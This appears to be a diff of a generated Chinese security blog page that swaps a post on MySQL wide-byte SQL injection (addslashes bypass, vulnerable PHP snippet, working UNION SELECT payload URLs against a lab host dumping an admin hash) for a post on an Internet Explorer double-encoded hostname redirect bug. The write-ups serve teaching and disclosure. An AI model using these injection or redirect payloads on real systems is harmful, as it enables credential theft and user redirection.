@@ -13,11 +13,11 @@
 
     <title>
         
-          MySQL 宽字节注入 - 蔡奇奇的博客 | CaiQiqi&#39;s Blog
+          IE的URL编码问题 - 蔡奇奇的博客 | CaiQiqi&#39;s Blog
         
     </title>
 
-    <link rel="canonical" href="https://github.com/caiqiqi/2017/06/08/MySQL-宽字节注入/">
+    <link rel="canonical" href="https://github.com/caiqiqi/2017/06/11/IE的URL编码问题/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -141,14 +141,14 @@
                 <div class="post-heading">
                     <div class="tags">
                         
-                          <a class="tag" href="/tags/#SQL" title="SQL">SQL</a>
+                          <a class="tag" href="/tags/#URL" title="URL">URL</a>
                         
                     </div>
-                    <h1>MySQL 宽字节注入</h1>
+                    <h1>IE的URL编码问题</h1>
                     <h2 class="subheading"></h2>
                     <span class="meta">
                         Posted by Cai Qiqi on
-                        2017-06-08
+                        2017-06-11
                     </span>
                 </div>
             </div>
@@ -167,20 +167,18 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <p>参考：<br><a href="http://blog.csdn.net/jnbbwyth/article/details/6991425" target="_blank" rel="external">http://blog.csdn.net/jnbbwyth/article/details/6991425</a><br><a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html</a></p>
-<h2 id="关于GBK编码和UTF-8编码"><a href="#关于GBK编码和UTF-8编码" class="headerlink" title="关于GBK编码和UTF-8编码"></a>关于GBK编码和UTF-8编码</h2><p>这个文件原文只有ASCII字符，当我加上两个汉字之后就不得不变成了UTF-8字符。<br><img src="http://img.blog.csdn.net/20170402151424182?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY2FpcWlpcWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
-<p><code>iconv</code>这个工具(MacOS, ubuntu和kali好像是自带的)可以用来转换编码。<br>比如，将一个文件从<code>utf-8</code>编码格式转换成<code>gbk</code>编码格式。注意要写明输出的文件名(<code>-o</code>)，不然会输出到标准输出。<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">iconv -f utf-8 -t gbk coding_test.php -o coding_test.php</div></pre></td></tr></table></figure></p>
-<p><img src="http://img.blog.csdn.net/20170402151516729?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY2FpcWlpcWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>利用<code>xxd</code>这个工具可以发现，在<code>utf-8</code>编码方式下，通过<code>e5928c</code>这个三个字节来表示一个汉字”和”；而在<code>gbk</code>编码方式下，通过<code>bacd</code>这两个字节来表示一个汉字”和”。由于汉字无法通过ASCII编码显示出来，于是xxd右边用<code>...</code>来表示几个字节。</p>
-<h2 id="MySQL-宽字节注入"><a href="#MySQL-宽字节注入" class="headerlink" title="MySQL 宽字节注入"></a>MySQL 宽字节注入</h2><p>加单引号不报错，说明不存在注入<br><img src="http://img.blog.csdn.net/20170403150914824?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY2FpcWlpcWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br><img src="http://img.blog.csdn.net/20170403150824082?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY2FpcWlpcWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>在这个sql语句前面，我们使用了一个<code>addslashes</code>函数，将<code>$id</code>的值转义。这是通常cms中对sql注入进行的操作，只要我们的输入参数在单引号中，就逃逸不出单引号的限制，无法注入。<br><figure class="highlight php"><table><tr><td class="code"><pre><div class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) ? addslashes($_GET[<span class="string">'id'</span>]) : <span class="number">1</span>;</div><div class="line">$sql = <span class="string">"SELECT * FROM news WHERE tid='&#123;$id&#125;'"</span>;</div></pre></td></tr></table></figure></p>
-<p>那么怎么逃过addslashes的限制？众所周知addslashes函数产生的效果就是，让<code>&#39;</code>变成<code>\&#39;</code>，让引号变得不再是“单引号”，只是一撇而已。一般绕过方式就是，想办法处理<code>\&#39;</code>前面的<code>\</code>：</p>
-<ol>
-<li>想办法给<code>\</code>前面再加一个<code>\</code>（或单数个即可），变成<code>\\’</code>，这样<code>\</code>被转义了，于是<code>&#39;</code>逃出了限制。</li>
-<li>想办法把<code>\</code>弄没有</li>
-</ol>
-<p>于是构造一个EXP。<br><code>http://192.168.10.163/data_and_sql/0x01/index.php?id=-1%a1%27UNION+Select+1,2,concat(name,0x23,pass)+FROM+admin#</code> <br><br><img src="http://img.blog.csdn.net/20170403153609289?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY2FpcWlpcWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>这样还是不行。注意要把末尾的<code>#</code>urlencode一下。<br><code>http://192.168.10.163/data_and_sql/0x01/index.php?id=-1%df%27%20union%20select%201,2,concat(name,0x23,pass)%20from%20admin%23</code><br><img src="http://img.blog.csdn.net/20170403153655673?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY2FpcWlpcWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br><figure class="highlight"><table><tr><td class="code"><pre><div class="line">MariaDB [test]&gt; select concat(name,0x23,pass) from admin;</div><div class="line">+----------------------------------------+</div><div class="line">| concat(name,0x23,pass)                 |</div><div class="line">+----------------------------------------+</div><div class="line">| admin#21232f297a57a5a743894a0e4a801fc3 |</div><div class="line">+----------------------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
-<p>其中<code>0x23</code>代表<code>#</code>。<code>concat(param1,param2,param3)</code>表示将这三个参数连接起来。</p>
-<h2 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h2><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">mysql_set_charset(&quot;utf8&quot;,$link);</div><div class="line">mysql_query(&quot;SET NAMES &apos;UTF8&apos;&quot;);</div></pre></td></tr></table></figure>
-<p>这两行的区别。<br><code>mysql_set_charset(&quot;utf8&quot;,$link);</code>其实做了<code>mysql_query(&quot;SET NAMES &#39;UTF8&#39;&quot;);</code>它做的事。而且后者并不被PHP官方建议。PHP官方建议使用前者，也就是<code>mysql_set_charset(&quot;utf8&quot;,$link);</code><br><a href="http://stackoverflow.com/questions/4361459/php-pdo-charset-set-names" target="_blank" rel="external">PHP PDO: charset, set names?</a><br><a href="http://stackoverflow.com/questions/26596294/set-names-vs-mysqli-set-charset-besides-affecting-mysqli-escape-string-are" target="_blank" rel="external">“set names” vs mysqli_set_charset — besides affecting mysqli_escape_string, are they identical?</a></p>
+                <p>参考：<br><a href="http://blog.innerht.ml" target="_blank" rel="external">http://blog.innerht.ml</a></p>
+<p>处理URL很容易搞错。有时候服务端对URL验证有一点点不准确都可能造成一些问题。这次呈现两个跟IE在处理URL重定向方面不当的问题。</p>
+<h1 id="GitHub-OAuth-Code-Theft"><a href="#GitHub-OAuth-Code-Theft" class="headerlink" title="GitHub OAuth Code Theft"></a>GitHub OAuth Code Theft</h1><p>URL编码，或者叫百分号编码，通常用在query string或者request body中。Hostname同样接收URL编码。然而当IE在重定URL编码过后的hostname的时候，发生了奇怪的事。比如，如果你用Windows 7/8.1的IE浏览器VS 其他浏览器访问以下链接的时候，你会发现目的地址是完全不同的。<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">https://httpbin.org/redirect-to?url=http://%2577%2577%2577%252E%256D%2569%2563%2572%256F%2573%256F%2566%2574%252E%2563%256F%256D/test</div></pre></td></tr></table></figure></p>
+<p>注：<code>httpbin.org</code>可以自己看一下它们主页上的介绍。<br>通过curl发现结果如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">➜  ~  curl -i &quot;https://httpbin.org/redirect-to?url=http://%2577%2577%2577%252E%256D%2569%2563%2572%256F%2573%256F%2566%2574%252E%2563%256F%256D/test&quot;</div><div class="line">HTTP/1.1 302 FOUND</div><div class="line">Connection: keep-alive</div><div class="line">Date: Sun, 11 Jun 2017 06:33:32 GMT</div><div class="line">Content-Type: text/html; charset=utf-8</div><div class="line">Content-Length: 0</div><div class="line">Location: http://%77%77%77%2E%6D%69%63%72%6F%73%6F%66%74%2E%63%6F%6D/test</div></pre></td></tr></table></figure></p>
+<p>在IE上的重定向地址是：<br><code>http://www.microsoft.com9crosoft.com/test</code><br>在其他浏览器上的重定向地址是：<br><code>http://www.microsoft.com/test</code></p>
+<p>在Firefox上的测试<br><img src="http://img.blog.csdn.net/20170611144250698?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY2FpcWlpcWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>这个<a href="https://web.archive.org/web/20131107024350/http://blackfan.ru/" target="_blank" rel="external">奇怪的行为</a>是由Sergey Bobrov发现的，这跟Michał Bentkowski发现的一个<a href="http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html" target="_blank" rel="external">bug</a>相似<br>其实就是IE<strong>用URL编码后的值覆盖了已经过URL解码之后的值</strong>，然后把它们混在了一起，于是最终的地址指向了非原始地址。这个bug似乎已经在Windows 10的IE11上修复了，然而在Windows 7/8.1上的IE仍然没有修复。</p>
+<p>总是就是，<code>如果一个redirect接收了URL编码后的hostname，用户就有可能被重定向到一个未知的网站。</code><br>//TODO</p>
+<h2 id="…"><a href="#…" class="headerlink" title="…"></a>…</h2><p>GitHub通过递归地normoalizeing在Location头中的值，修复了这个bug</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://hackerone.com/reports/154385" target="_blank" rel="external">Original report from HackerOne</a></li>
+<li><a href="https://bounty.github.com/researchers/filedescriptor.html" target="_blank" rel="external">GitHub’s summary to this bug</a></li>
+</ul>
 
 
                 <hr>
@@ -189,13 +187,9 @@
 
                 <ul class="pager">
                     
-                        <li class="previous">
-                            <a href="/2017/06/11/IE的URL编码问题/" data-toggle="tooltip" data-placement="top" title="IE的URL编码问题">&larr; Previous Post</a>
-                        </li>
-                    
                     
                         <li class="next">
-                            <a href="/2017/04/13/ubuntu-kali设置时间/" data-toggle="tooltip" data-placement="top" title="ubuntu/kali设置时间">Next Post &rarr;</a>
+                            <a href="/2017/06/08/MySQL-宽字节注入/" data-toggle="tooltip" data-placement="top" title="MySQL 宽字节注入">Next Post &rarr;</a>
                         </li>
                     
                 </ul>
@@ -222,7 +216,7 @@
                     <h5><a href="/tags/">FEATURED TAGS</a></h5>
                     <div class="tags">
                        
-                          <a class="tag" href="/tags/#SQL" title="SQL">SQL</a>
+                          <a class="tag" href="/tags/#URL" title="URL">URL</a>
                         
                     </div>
                 </section>
